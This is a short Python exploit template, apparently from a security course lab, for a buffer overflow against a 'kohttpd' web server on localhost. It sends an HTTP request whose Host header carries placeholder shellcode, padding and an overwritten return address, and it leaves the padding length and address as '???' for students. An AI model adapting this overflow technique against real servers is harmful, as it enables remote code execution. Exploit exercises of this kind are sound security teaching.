#!/usr/bin/python3
from socket import *
import struct

'''Use/modify this script for the kohttpd webservers'''

ADDR = '127.0.0.1'
PORT = 31337

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

exploit = b"\xeb\xfe"

#exploit = ""
#with open(expfile, "rb") as fh:
#    exploit = fh.read()

PADLEN = ???
address = ???
# this will be the same for all remaining labs
x = b'GET /asdf.vbs HTTP/1.1\r\n'

# this will get modified
x += b'Host:' + exploit + b'A'*(PADLEN - len(exploit))
x += struct.pack("<Q", address)
x += b'\r\n'
x += b'\r\n'

s.send(x)

print(s.recv(1024))
